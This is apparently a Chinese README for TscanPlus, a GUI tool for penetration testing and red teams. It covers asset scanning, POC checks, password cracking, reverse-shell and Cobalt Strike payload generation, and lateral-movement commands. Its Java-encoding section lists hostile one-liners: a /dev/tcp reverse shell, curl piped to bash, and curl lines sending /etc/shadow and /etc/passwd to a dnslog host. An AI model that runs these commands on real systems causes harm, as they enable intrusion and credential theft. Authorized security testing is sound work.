
<div align=center><img src=images/TscanPlus.png width=50% ></div>


## 无影(TscanPlus)
一款综合性网络安全检测和运维工具，旨在快速资产发现、识别、检测，构建基础资产信息库，协助甲方安全团队或者安全运维人员有效侦察和检索资产，发现存在的薄弱点和攻击面。

**【主要功能】** 端口探测、服务识别、URL指纹识别、POC验证、弱口令猜解、目录扫描、域名探测、网络空探、项目管理等。

**【辅助功能】** 编码解码、加密解密、CS上线、反弹shell、杀软查询、提权辅助、常用命令、字典生成、JAVA编码、资产分拣等。

https://github.com/TideSec/TscanPlus/assets/46297163/0f8cff21-6c33-4da3-bb6d-5f33d032a23e

<video controls="controls" loop="loop" autoplay="autoplay"> 
    <source src="images/TscanPlus-Introduce.mp4" type="video/mp4">
</video>


在2019年就用Python写过指纹识别工具——[TideFinger](https://github.com/TideSec/TideFinger)，并实现了一个免费在线的指纹检测平台——潮汐指纹[http://finger.tidesec.com](http://finger.tidesec.com)，目前已积累用户3万余人，每日指纹识别约2000余次，2023年初又基于Go语言开发了Go版的[TideFinger_Go](https://github.com/TideSec/TideFinger_Go)，在web指纹和服务指纹的识别方面积累了一些经验。后来我们团队内部大佬基于Fscan开发了一个Tscan，主要是用于内部的POC收集整理并形成自动化武器库，可基于指纹识别结果对poc进行精准检测。无影(TscanPlus)就是以指纹和Poc为根基，扩展了多项自动化功能，可大大提高安全运维和安全检测的效率，方便网络安全从业者使用。

**【特色功能】**

1、内置2.6W余条指纹数据，对1万个web系统进行指纹识别仅需8-10分钟，在效率和指纹覆盖面方面应该是目前较高的了。

2、在指纹探测结果中，对130多个红队常见CMS和框架、Poc可关联CMS进行了自动标注。

3、可实现指纹和Poc的联动，根据指纹识别的结果自动关联Poc，并可直接查看poc数据包相关信息。

4、在创建IP端口扫描、Url扫描时，可关联Poc检测、密码破解、目录扫描等功能，发现匹配的服务或产品时会自动触发密码破解或poc检测。

5、内置34种常见服务的弱口令破解，可方便管理员对内网弱口令进行排查，为提高检测效率，优选并精简每个服务的用户名和密码字典。覆盖的服务包括：SSH,RDP,SMB,MYSQL,SQLServer,Oracle,MongoDB,Redis,PostgreSQL,MemCached,Elasticsearch,FTP,Telnet,WinRM,VNC,SVN,Tomcat,WebLogic,Jboss,Zookeeper,Socks5,SNMP,WMI,LDAP,LDAPS,SMTP,POP3,IMAP,SMTP_SSL,IMAP_SSL,POP3_SSL,RouterOS,WebBasicAuth,Webdav,CobaltStrike等。

6、目录枚举默认使用HEAD方式，可对并发、超时、过滤、字典等进行自定义，内置了DirSearch的字典，可导入自己的字典文件，也可用内置字典fuzz工具进行生成。

7、内置各类反弹shell命令85条、Win内网(凭证获取、权限维持、横向移动)命令26类、Linux内网命令18类、下载命令31条、MSF生成命令21条、CS免杀上线命令等，可根据shell类型、操作系统类型、监听类型自动生成代码。

8、灵活的代理设置，可一键设置全局代理，也可以各模块单独开启代理功能，支持HTTP(S)/SOCKS5两种代理，支持身份认证。

9、快速的子域名探测，域名可联动其他子功能，可配置key后对接多个网络空间探测平台，一键查询去重(待完成)。

10、内置Windows提权辅助、杀软查询、shiro解密(待完成)、编码解码等各类工具。



**【免责声明&使用许可】**

1、本工具禁止进行未授权商业用途，**禁止二次开发后进行未授权商业用途**。

2、本工具仅面向合法授权的企业安全建设行为，在使用本工具进行检测时，您应**确保该行为符合当地的法律法规**，并且已经**取得了足够的授权**。

3、如您在使用本工具的过程中存在任何**非法行为**，您需自行承担相应后果，我们将不承担任何法律及连带责任。

4、在安装并使用本工具前，请**务必审慎阅读、充分理解各条款内容，并接受本协议所有条款，否则，请不要使用本工具**。您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。


## 目录

* [更新日志](#更新日志)
* [软件使用](#软件使用)
    * [软件下载及更新](#1软件下载及更新)
    * [Welcome](#2Welcome)
    * [项目管理](#3项目管理)
    * [端口扫描](#4端口扫描)
    * [URL探测](#5URL探测)
    * [域名枚举](#6域名枚举)
    * [POC检测](#7POC检测)
    * [密码破解](#8密码破解)
    * [空间测绘](#9空间测绘)
    * [目录枚举](#10目录枚举)
    * [UrlFinder](#11UrlFinder)
    * [上线反弹](#12上线反弹)
        * 【反弹shell】
        * 【CS上线】
    * [红队命令](#13红队命令)
        * 【红队命令】
        * 【下载命令】
        * 【java编码】
    * [辅助工具](#14辅助工具)
        * 【密码生成】
        * 【密码查询】
        * 【提权辅助】
        * 【杀软查询】
    * [其他功能](#15其他功能)
        * 【导出功能】
        * 【数据库管理】
        * 【配置管理】
        * 【主题设置】
* [软件下载](#软件下载)
* [致谢](#致谢)
* [FAQ](#FAQ)

### 更新日志

感谢各位师傅提出的宝贵修改建议和诸多bug！

**所有提过bug或建议的小伙伴可加入工具交流群，并享受新版本新功能第一时间尝鲜及永久VIP服务！**

群已满200人，加下方微信号，备注"工具交流群"会拉群，非实时在线回复可能不太及时，见谅。

<div align=center><img src=images/wxxzs.png width=30% ></div>

v1.7版 【2024.04.16】 

	1、Poc检测可直接调用Nuclei、Xray、Afrog @J1wa @无先森   
	2、增加自定义poc功能 
	3、在高级选项中增加自定义主题模式
	4、IP扫描时会先探测是否存在防火墙 
	5、增加资产分拣功能 @xxsmile123
	6、优化更新账号和密码字典 @那个少年
	7、优化自定义账号密码功能 @DeEpinGh0st
	8、自定义配置目录、导出目录等 @づ听风看月 @蜉蝣
	9、修复项目管理若干Bug  @无先森 @Evi10x01
	10、敏感目录字典更新 @无先森
	11、Fofa自定义api地址 @Tian @季風吹向大海คิดถึง 
	12、项管理添加进度状态展示
	13、UrlFinder功能优化完善及bug修复 @A1
	14、强化Url敏感信息检索功能 @xxsmile123
	15、密码破解功能优化完善 @步行街 @endin9 @Y.
	16、Banner标红资产自动排序 @Evi10x01
	17、部分指纹精确度优化 @Black @倏尔 @高歌
	18、目录扫描自定义字典bug @Evi10x01
	19、项目任务中的目录枚举功能优化 @鼎级FW
	20、项目任务自定义字典功能优化 

v1.6版 【2024.03.25】 

	1、增加项目管理流程，增强各功能模块联动
	2、使用数据库可对所有功能和数据进行增删改查
	3、添加js爬取功能及js敏感信息匹配 @onewinner  @无先森
	4、敏感目录字典更新 @无先森
	5、配置代理增加前端校验 @WangGang
	6、目录枚举Ext及3xx跳转优化 @无先森 @Zxc123456zxc
	7、网络空探导出所有tab到一个excel @Evi10x01
	8、优化代理设置模块，完善校验和提示 @一口蛋黄苏
	9、密码破解修改端口每次只能输一位 @nuanfeng1yue @💪  @零乱  @清风拂杨柳
	10、端口扫描增加只探测存活选项 @Wans @Black
	11、poc检测增加Log模块 
	12、URL探测联动功能bug  @Evi10x01	
	13、IP端口扫描时闪退问题 @xxsmile123 @Thron_bird
	14、空间测绘添加body、证书、ICON检索  @Tian
	15、空间测绘右键添加继续查询标题、ip、域名等  @Tian
	16、生成字典枚举模式闪退 @咕噜咕噜

v1.5版 【2024.03.01】 

	1、目录枚举超链接bug @无先森 @Google_Hacking
	2、扫描目标过多时，点击终止后会继续扫描 @行者无疆
	3、增加一键检测ApiKey可用性功能 @Dawn❤
	4、枚举模式生成字典会异常退出  @无先森
	5、大量数据时前端会有卡顿 @零乱 @Mr.Right @impdx
	6、指纹识别中hostname乱码问题 @hunmeng123 @2gggggg
	7、AV识别数据库更新 @pei
	8、网络空间测绘增加url跳转及优化  @づ听风看月 @80576560
	9、Mac深色Url超链接样式优化 @下完雪🍁
	10、FofaApi接口权限bug @Bains @💪
	11、多次查询时Tab数据可能覆盖 @J1wa
	12、导出excel时报错 @Huck-Lim 
	13、空间测绘VT平台数据回传问题 @Evi10x01
	14、密码破解log无法清除 @sq565163
	15、个别网站标题乱码问题 @Dawn❤️
	16、支持自定义添加红队命令 @Lelylsj 
	17、支持自定义设备密码  @Sharlong-Wen
	18、优化端口、URL的检索功能 @xxxxl🐾
	19、配置文件版本号同步 @づ听风看月
	20、配置cookie未生效 @bupsdx

v1.4版 【2024.02.18】 

	1、增加网络空间探测功能模块，内置9种常见空间探测API
	2、目录枚举功能进行字典优化和重分类，感谢师傅 @无先森 
	3、消息窗口不消失 @J1wa  @Hhhnee
	4、空间探测平台api接口协助 @Grit
	5、增加目录枚举递归限制，默认3层 @Google_Hacking
	6、目录枚举过滤指定长度、关键字，自定义后缀  @无先森

v1.3版 【2024.01.22】 

	1、增加密码生成功能，内置三种生成模式
	2、增加设备弱口令查询功能，内置1.1万条记录
	3、新增分页功能，并可跨页面进行多选
	4、目录扫描点击stop闪退 @转身遇见 @Google_Hacking
	5、端口扫描兼容域名，及进度NaN的问题 @无先森  
	6、精简优化扫描端口及超链接bug @xxxxl🐾
	7、自定义字典换行编码问题  @无先森
	8、域名泛解析问题 @无先森
	9、导出excel多一列及乱序bug @一起看雪 @南
	10、密码破解任务无法停止 @冰點  @T-T

v1.2版 【2024.01.10】 

	1、增加子域名枚举、接口查询功能
	2、针对非web服务的指纹识别进行优化
	3、增加导出excel功能，完善更多右键功能
	4、实时保存数据到result.txt文件
	5、增加批量多选功能 @Dawn  @piaolingshusheng
	6、修复目录枚举闪退 @Google_Hacking @Bains @LC
	7、自定义密码框输入Bug @이 소
	8、导入字典数据显示错误 @Zxc123456zxc
	9、增加目录扫描递归选项 @onewinner  @T-T
	10、扫描时的进度和存活数量问题  @💪  @龙猫爱吃鱼
	11、增加排序及相关过滤功能  @xg
	12、大量Url时的闪退Bug @rtfghd @无先森

v1.1版 【2023.12.27】 

	1、新增加java命令编码，解决部分按钮无效 @Dawn 
	2、修复windows ping扫描cmd窗口 @遥遥 @hunmeng123
	3、修复B段扫描时卡死情况 @Mr.Right
	4、目录枚举同长度出现3次以上不再显示 @Bains 
	5、自定义poc异常退出问题 @qtz777 @Zxc123456zxc
	6、修复路径字典错误、编码错误、前端校验错误 @遥遥 @TXC
	7、重构目录枚举实现方式，效率提高10倍 
	8、IP扫描和指纹识别同步进行 
	9、Ip扫描、Url扫描增加状态栏
	10、密码破解时自定义字典无效问题	

v1.0版 【2023.12.21】 实现局部/全局代理功能，支持HTTP(s)/SOCKS5，正式版发布

v0.9版 【2023.12.19】 实现各功能之间的任务联动及右键菜单联动 

v0.8版 【2023.12.15】 增加版本更新检查、有效期校验、配置文件读写等 

v0.7版 【2023.12.12】 辅助功能杀软查询、提权辅助完成

v0.6版 【2023.12.10】 反弹shell、CS上线、下载命令、红队命令完成

v0.5版 【2023.12.08】 目录枚举及Fuzz模式实现 

v0.4版 【2023.11.29】 弱口令破解模块功能实现

v0.3版 【2023.11.18】 Poc检测及Poc指纹匹配功能实现

v0.2版 【2023.11.01】 Url扫描及web指纹精简功能实现

v0.1版 【2023.10.23】 Ip及端口扫描、服务识别功能实现

v0.0版 【2023.10.10】 TscanPlus架构选择及功能初步规划



### 软件使用

#### 1、软件下载及更新

Github下载：https://github.com/TideSec/Tscanplus   

知识星球：【剑影安全实验室】见下方二维码（**更多、更新版本**）

软件基于Wails开发，可支持Windows/Mac/Linux等系统，下载即可使用。

由于MacOs的一些安全设置，可能会出现个别问题，如报错、闪退等情况，详见最下方FAQ。

Windows运行时依赖 [Microsoft WebView2](https://developer.microsoft.com/en-us/microsoft-edge/webview2/)，默认情况下，Windows11和win2012会安装它，但有些旧机器(如Win2k8)不会，如机器没有webview2环境，程序会引导下载安装webview2。另外Windows程序使用了Upx压缩，杀毒软件可能会报病毒，请自查。

#### 2、Welcome

软件运行后，需审慎阅读、充分理解 **《免责声明&使用许可》** 内容，并在Welcome页面勾选 **“我同意所有条款”** ，之后方可使用本软件。

<div align=center><img src=images/image-20240327171101515.png width=80% ></div>

####  3、项目管理

项目管理功能是把各功能进行流程整合，用户可根据自己的使用场景设计项目功能，完美融合了"资产测绘"、"子域名枚举"、"IP端口扫描"、"密码破解"、"POC检测"、"URL扫描"、"目录探测"、"UrlFinder"等功能。项目执行结果会存储到相应项目数据库中，方便后续查询和使用。

**【任务配置】**

在添加目标资产并配置任务参数后，TscanPlus会在后台对相应目标执行相应操作，并显示在对应功能Tab栏中。

1、各任务为顺序执行，"资产测绘" => "子域名枚举" => "IP端口扫描" => "密码破解" => "POC检测" => "URL扫描" => "目录探测" => "UrlFinder"，默认情况下，上一步探测发现的资产会作为后一阶段的资产输入。

2、在使用资产测绘功能时，如果测绘发现的资产可能不属于你的目标范围时，开启“对资产测绘结果进行扫描和POC检测”时，空间测绘的资产可能超授权范围，请慎用。

3、开启URL探测功能后，会对域名+IP+URL+空间测绘等发现的所有web应用进行URL指纹探测。

4、不选择“POC匹配指纹”时，会对所有探测到的资产+所有POC进行测试。

5、开启“所有端口和服务”后，会对匹配到的所有端口和服务进行破解，不开启时只破解常见的8种服务。

6、在使用目录探测功能时，如选择"仅URL列表"时，仅会对URL列表中的URL进行目录探测。选择"所有结果URL"时，会对IP探测、域名任务等发现的所有URL进行目录探测，当URL较多时可能会较慢。

<div align=center><img src=images/image-20240327161224753.png  width=80% ></div>

**【项目管理】**

在项目管理中，还可直观的展示项目概览，如项目总数、URL资产、IP资产、漏洞总数、敏感信息等，并可对所有项目进行编辑、重新执行、停止、删除等操作。

<div align=center><img src=images/image-20240327160041727.png  width=80% ></div>

**【结果展示】**

所有扫描结果将显示在对应功能Tab中。

<div align=center><img src=images/image-20240327160956342.png  width=80% ></div>

#### 4、端口扫描

对目标IP进行存活探测、端口开放探测、端口服务识别、Banner识别等，可识别100余种服务和协议。

**【任务配置】**

IP支持换行分割，支持如下格式：192.168.1.1、192.168.1.1/24、192.168.1.1-255、192.168.1.1,192.168.1.3

排除IP可在可支持输入的IP格式前加!： !192.168.1.1/26

可选择端口策略、是否启用Ping扫描、是否同步密码破解、是否同步POC检测、是否开启代理，配置任务后可开启扫描。

**【扫描结果】**

扫描结果如下，会显示服务相关协议、Banner、状态码、标题等，如Banner中匹配到可能存在漏洞的产品会使用红色标识。

选择某一行，右键菜单也可对某地址进行单独POC测试、弱口令测试、目录枚举等，也可以对数据进行单条保存或全部保存。

<div align=center><img src=images/image-20231221132923278.png width=80% ></div>

**【功能联动】**

在任意功能中，都可与其他功能进行联动，比如IP扫描时可同时开启密码破解和POC检测，一旦发现匹配的端口服务会自动进行密码破解，发现匹配的指纹时会进行poc检测。勾选这两项即可，结果会显示在相关模块中。

<div align=center><img src=images/image-20231221144525144.png width=80% ></div>


https://github.com/TideSec/TscanPlus/assets/46297163/2a88ced9-1612-4015-aa5e-0bb0e243525a

<video controls="controls" loop="loop" autoplay="autoplay"> 
    <source src="images/TscanPlus.mp4" type="video/mp4">
</video>


**【高级配置】**

在高级配置中可设置代理地址，在开启全局代理后，各功能都会代理，支持HTTP(S)/SOCKS5两种代理，支持身份认证。还可以设置全局cookie或UA等。

代理格式：

HTTP代理格式：http://10.10.10.10:8081  或 http://user:pass@10.10.10.10:8081  

HTTPS代理格式：https://10.10.10.10:8081  或 https://user:pass@10.10.10.10:8081  

Socks5代理格式：socks5://10.10.10.10:8081  或 socks5://user:pass@10.10.10.10:8081  

<div align=center><img src=images/image-20231221133246236.png width=80% ></div>

#### 5、URL探测

TscanPlus目前整合指纹2.6W余条，经多次优化，有效提高了资产发现的协程并发效率，对1万个web系统进行指纹识别仅需8-10分钟，在效率和指纹覆盖面方面应该是目前较高的了。

**【任务配置】**

URL探测主要针对web地址进行批量检测，输入格式为Url地址每行一个，并且前缀为http/https：
http://www.abc.com
http://192.168.1.1:8080
https://www.abc.com:8443

同样，可选择线程数、是否同步POC检测、是否开启代理，配置任务后可开启扫描。

**【扫描结果】**

扫描结果如下，会显示web站点标题、Banner、状态码、中间件、WAF识别等，如Banner中匹配到可能存在漏洞的产品会使用红色标识。

选择某一行，右键菜单也可对某地址进行单独POC测试、目录枚举等，也可以对数据进行单条保存或全部保存。

<div align=center><img src=images/image-20231221133907830.png width=80% ></div>

#### 6、域名枚举

在域名枚举方面TscanPlus集成了多种功能，可以使用字典枚举，也可以使用多个免费接口进行查询。

**【任务配置】**

枚举较依赖网络，所以多域名时会逐个进行。默认10000的字典，线程50在网络状态较好时大约用时12秒。

域名每行一个，不要加http前缀，如:

tidesec.com
tidesec.com.cn

同样，可选择线程数（建议50-00）、是否同步POC检测、是否指纹识别，配置任务后可开启域名任务。

**【扫描结果】**

扫描结果如下，会显示子域名、解析IP、开放端口、网站标题、域名来源等，如Banner中匹配到可能存在漏洞的产品会使用红色标识。

选择某一行或多行，右键菜单也可对某地址进行单独POC测试、目录枚举等，也可以对数据进行单条保存或全部保存。

<div align=center><img src=images/image-20240110164454188.png width=80% ></div>

#### 7、POC检测

TscanPlus内置了部分POC，并进行了Level分类，Level1是最常见、使用频率最高的POC，Level2是较通用的POC，Level3为不太常见POC。

**【任务配置】**

URL可导入txt文件，也可自行输入，必须是HTTP/HTTPS为前缀的URL地址。

比较重要的一个选项是“POC匹配指纹”，默认开启这个选项，这时会根据指纹信息匹配POC，如匹配不到POC则不检测。关闭该选项后，会对所有选择的POC进行测试。

POC选项可指定外部POC文件或POC文件夹，在后面输入POC的绝对路径，如C:\POC，但导入的POC无法和指纹进行匹配，默认会把导入的POC全跑一遍。

外部POC可支持Xray或Xray或同样格式的POC，POC编写可参考：https://poc.xray.cool/ 或 https://phith0n.github.io/xray-poc-generation/

**【自定义poc】**

Poc检测可直接调用Nuclei、Xray、Afrog等外部POC工具，并可对各工具的poc进行自定义。

<div align=center><img src=images/image-20240417162352536.png width=80% ></div>

**【扫描结果】**

扫描结果如下，会显示发现漏洞的站点、POC名称、Banner、状态码、标题等，选择某一行后，可查看Request和Response数据包。

最下方会显示目标存活数量、检测成功POC数量、检测队列情况、用时等。

<div align=center><img src=images/image-20231221135024558.png width=80% ></div>

#### 8、密码破解

TscanPlus内置34种常见服务的弱口令破解，可方便管理员对内网弱口令进行排查，为提高检测效率，优选并精简每个服务的用户名和密码字典。覆盖的服务包括：SSH,RDP,SMB,MYSQL,SQLServer,Oracle,MongoDB,Redis,PostgreSQL,MemCached,Elasticsearch,FTP,Telnet,WinRM,VNC,SVN,Tomcat,WebLogic,Jboss,Zookeeper,Socks5,SNMP,WMI,LDAP,LDAPS,SMTP,POP3,IMAP,SMTP_SSL,IMAP_SSL,POP3_SSL,RouterOS,WebBasicAuth,Webdav,CobaltStrike等。

**【任务配置】**

在左侧选定要破解的服务，并填入目标地址即可。右侧配置任务时，可选择使用内置字典或自行导入、是否开启指纹识别、Oracle监听设置、执行命令等。

<div align=center><img src=images/image-20240417162518632.png width=80% ></div>



**【扫描结果】**

扫描结果如下，会显示发现弱口令的服务、账号、密码、Banner、执行命令、用时等。

最下方会显示目标存活数量、破解成功数量、检测队列情况、用时等，并会实时显示破解日志。

<div align=center><img src=images/image-20231221140432486.png width=80% ></div>

#### 9、空间测绘

为使信息搜集更快捷方便，TscanPlus集成了多个网络空间测绘接口，包括鹰图**Hunter、Fofa、shodan、360 Quake、Zoomeye 钟馗之眼、Censys、微步在线ThreatBook、BinaryEdge、VirusTotal**等9个主流空探API，可根据域名、IP地址、端口、应用、服务等进行检索，并对各网络空探结果进行去重整合。

**【任务配置】**

首先要配置key信息，如没有key可点击后面"API申请"进行申请，之后点击启用即可使用该API接口。

在主界面选择字段，如域名、IP地址、端口、应用、服务、body、证书、ICON等进行检索，并输入检索条件即可。TscanPlus会对所有结果进行去重和整合。

针对Fofa API增加自定义API地址功能，在设置Fofa ApiKey时，如需要使用自定义API地址功能，格式只要按照`邮箱:key||url`，在url和key之间为双竖线即可，示例如下：`9*****@qq.com:3f21a408*********6e3fa8078||http://fofaapi.com`,添加完成后可进行key可用性验证，测试是否能获取数据。

<div align=center><img src=images/image-20240327165140791.png  width=80% ></div>



**【查询结果】**

查询结果如下，会显示URL、IP、域名、端口、协议、标题、指纹、应用、Whois、备案、ISP、OS、地区、更新时间、API来源等信息。

选择某一行或多行，右键菜单也可对某地址进行单独POC测试、目录枚举、端口扫描等，也可以对数据进行单条保存或全部保存。

<div align=center><img src=images/image-20240327164931978.png width=80% ></div>

#### 10、目录枚举

目录枚举主要是对web站点进行目录枚举，支持字典模式、Fuzz模式、存活探测等，支持HEAD/GET方法，默认使用HEAD方法。

**【任务配置】**

字典默认使用dirsearch内置字典，大约9000条数据，扩展支持asp、aspx、jsp、php、py等格式，TideFuzz开启后会根据枚举结果进行递归Fuzz。

如果使用Fuzz模式，需输入fuzz元字符，之后会根据fuzz长度生成字典，但注意fuzz字典不能过大，当字典超过10万行时会提示字典过大，无法扫描。

还可以配置超时时间、超时重试次数、间隔时间、URL并发数、目录线程数等，并可以对扩展名、状态码进行过滤。

**【扫描结果】**

扫描结果如下，会显示发现的URL地址、状态码、Body长度等，选择某一行后，可查看Request和Response数据包。

最下方会显示目标存活数量、枚举成功数量、检测队列情况、用时等。

<div align=center><img src=images/image-20240219111318207.png width=80% ></div>

#### 11、UrlFinder

URLFinder功能可对目标信息进行快速、全面的提取，可用于分析页面中的js与url，查找隐藏在其中的敏感信息或未授权api接口。

**【任务配置】**

输入目标地址后，可进行模式选择，"普通模式"默认对单层链接进行抓取，"深入模式"会对链接进行三层抓取，耗时相对长一些。

探测层数可设置探测的链接层数，上限数量是对URL总数进行限制，防止无限制爬取。

"仅显示本站"是对URL和JS结果进行过滤，此外还可以配置线程数，并可以对扩展名、状态码、关键词进行过滤。

**【扫描结果】**

扫描结果如下，会显示发现的URL地址、状态码、Body长度等，当发现敏感信息时，会在"标题||敏感信息"列中显示。

最下方会显示目标存活数量、枚举成功数量、检测队列情况、用时等。

1、对返回同样长度、同样状态码的页面，出现5次以上不再显示

2、增加关键字过滤、返回长度过滤、自定义后缀等功能。

<div align=center><img src=images/image-20240327163203001.png  width=80% ></div>

#### 12、上线反弹

TscanPlus内置各类反弹shell命令85条、MSF生成命令21条、CS免杀上线命令等，可根据shell类型、操作系统类型、监听类型自动生成代码。

##### **【反弹shell】**

可设置IP/PORT、listener类型、shell类型、是否编码，选择你想要的命令后，即可生成响应代码。

<div align=center><img src=images/image-20231221141826648.png width=80% ></div>

##### **【CS上线】**

CS上线配置CS Payload地址后，即可生成相应代码。

<div align=center><img src=images/image-20231221141838825.png width=80% ></div>

#### 13、红队命令

TscanPlus内置常用红队命令，包括Win内网(凭证获取、权限维持、横向移动)命令26类、Linux内网命令18类、下载命令31条。

##### **【红队命令】**

Win内网(凭证获取、权限维持、横向移动)命令26类、Linux内网命令18类。

<div align=center><img src=images/image-20231221142158055.png width=80% ></div>

##### **【下载命令】**

内置常见下载命令31条，基本能覆盖内网渗透能用到的下载方法。

配置URL地址和目标文件名后，可自动生成相应代码。

<div align=center><img src=images/image-20231221142332714.png width=80% ></div>

#####  **【java编码】**

有时，通过 `Runtime.getRuntime().exec()` 执行命令有效负载会导致失败。使用 WebShell，反序列化利用或通过其他媒介时，可能会发生这种情况。

有时这是因为重定向和管道字符的使用方式在正在启动的进程的上下文中没有意义。例如，`ls > dir_listing`在shell中执行应该将当前目录的列表输出到名为的文件中`dir_listing`。但是在`exec()`函数的上下文中，该命令将被解释为获取`>`和`dir_listing`目录的列表。

其他时候，其中包含空格的参数会被StringTokenizer类破坏，该类将空格分割为命令字符串。那样的东西`ls "My Directory"`会被解释为`ls '"My' 'Directory"'`。

在Base64编码的帮助下，java命令编码转换器可以帮助减少这些问题。它可以通过调用Bash或PowerShell再次使管道和重定向更好，并且还确保参数中没有空格。

常用命令清单

```
bash -i >& /dev/tcp/127.0.0.1/6666 0>&1
ping `whoami`.key.dnslog.cn
curl http://www.google.com/bash.txt|bash
curl http://key.dnslog.cn/?r=`whoami`
curl http://key.dnslog.cn/?r=`cat /etc/shadow|base64`
curl http://key.dnslog.cn/?r=$(cat /etc/passwd|base64|tr '\n' '-')
curl http://www.google.com/key.txt
curl http://www.google.com/key.txt -O
curl http://www.google.com/key.txt -o key.txt
```

<div align=center><img src=images/image-20240111143548211.png width=80% ></div>

#### 14、辅助工具

TscanPlus内置Windows提权辅助、杀软查询等工具，目前shiro解密、字典生成等模块还在完善，后续会持续更新。

##### **【密码生成】**

提供了三种密码生成方式，包括社工字典生成、组织方式和枚举模式。可根据需求不同来生成更有针对性的字典文件。

<div align=center><img src=images/01.png width=80% ></div>

##### **【密码查询】**

内置了10733条常见设备和产品的默认账号密码，可直接进行查询并导出。

<div align=center><img src=images/02.png width=80% ></div>

##### **【提权辅助】**

根据systeminfo信息查询未修补的漏洞信息，返回漏洞微软编号、补丁编号、漏洞描述、影响系统等信息。

<div align=center><img src=images/image-20231221142455293.png width=80% ></div>

##### **【杀软查询】**

根据windows的tasklist信息，匹配杀软进程，内置1042条杀软识别规则。返回进程名称、进程ID、杀软名称等信息。

<div align=center><img src=images/image-20231221142616501.png width=80% ></div>

**【资产分拣】**

可一键提取资产中的主域名、子域名、IP、URL、Tscan/Fscan结果。

<div align=center><img src=images/image-20240417162102818.png width=80% ></div>



#### 15、其他功能

#####  **【导出功能】**

1、在所有功能模块中，新增了导出excel功能，默认会保存在程序根目录下。

2、在所有功能模块中，可对所有列内容进行排序和个过滤。

3、在所有功能模块中，可多选或全选模板，并进行批量操作，如进行poc检测、密码破解、目录枚举等。

4、对软件执行过程中发现的所有资产、威胁进行实时保存，保存路径为程序所有在根目录下的result.txt文件中。

<div align=center><img src=images/image-20240111144248390.png width=80% ></div>

<div align=center><img src=images/image-20240111144635519.png width=80% ></div>

##### **【数据库管理】**

可对所有数据进行持久存储和使用。默认DB文件会在config文件下生成。

<div align=center><img src=images/image-20240327165547238.png  width=80% ></div>

##### 【配置管理】

对各功能配置参数写入配置文件，参数修改后只要执行一次相应功能就会写入配置文件，下次无需再次修改。

<div align=center><img src=images/image-20240327165714901.png  width=80% ></div>

红队命令、上线命令、默认密码等可自定义添加，并保存在配置文件。

<div align=center><img src=images/image-20240327165814782.png  width=80% ></div>

##### 【主题设置】

增加系统主题设定，在任意页面打开"高级配置"，可对系统主题进行配置，选择深色或浅色模式。（该功能基于wails框架，mac兼容较好，在windows部分系统上应用可能存在问题）

<div align=center><img src=images/image-20240327165922789.png  width=80% ></div>

Mac系统下的的深色和浅色主题对比。

<div align=center><img src=images/image-20240327172657687.png  width=80% ></div>

### 软件下载

Github下载：https://github.com/TideSec/Tscanplus   知识星球：下方二维码（更多、更新版本）

部分功能还在完善（子域名模块、POC自定义功能等），目前暂不提供源码，这里打包了windows/mac/linux三个版本的TscanPlus供下载。

本次编译的均为x64_AMD架构，有需要x86版本或ARM版的可到星球下载。

**后续版本更新和Bug反馈也会第一时间在星球进行更新。**



<div align=center><img src=images/zsxq.png width=50% ></div>







### 致谢

工具开发中参考了很多知名的Go检测工具和指纹识别软件，在此一并感谢。

- YHY大佬的承影项目：https://github.com/yhy0/ChYing 
- 影舞者大佬的fscan项目：https://github.com/shadow1ng/fscan 
- zhzyker大佬的dismap项目：https://github.com/zhzyker/dismap 
- ServerScan项目：https://github.com/Adminisme/ServerScan 
- Dirsearch项目：https://github.com/maurosoria/dirsearch 

### FAQ

**1、MacOS安装问题**

Mac上可能遇到不少执行问题，如「xxx已损坏，无法打开，您应该将它移到废纸篓」、「打不开xxx，因为 Apple 无法检查其是否包含恶意软件」、「打不开 xxx，因为它来自身份不明的开发者」，可参考下面两篇文章，基本能解决95%的问题。

https://cloud.tencent.com/developer/article/2216717?areaId=106001  【苹果电脑安装软件后，提示mac文件已损坏,无法打开怎么办？】

https://sysin.org/blog/macos-if-crashes-when-opening/    【macOS 提示：“应用程序” 已损坏，无法打开的解决方法总结】

目前Mac遇到的比较多的就是闪退问题，执行下面的命令即可解决：

`sudo xattr -r -d com.apple.quarantine TscanPlus_darwin_amd64_v1.0.app`

如果还是不行，再执行这个：

`sudo codesign --sign - --force --deep TscanPlus_darwin_amd64_v1.0.app`

**2、Windows依赖WebView2环境**

Wails打包的程序在Windows上运行时依赖 [Microsoft WebView2](https://developer.microsoft.com/en-us/microsoft-edge/webview2/)，而默认情况下Windows11和win2012会安装，但有些旧机器(如Win2k8)不会，如机器没有webview2环境，程序会引导下载安装webview2。也可自行手动下载：https://developer.microsoft.com/en-us/microsoft-edge/webview2。

**3、Windows杀软报病毒问题**

程序使用Go开发，Windows版本使用upx进行了加壳，杀软可能会报毒，请自行排查。



**4、其他软件bug可提到Github的Issue或知识星球中，后续会逐一修复。**

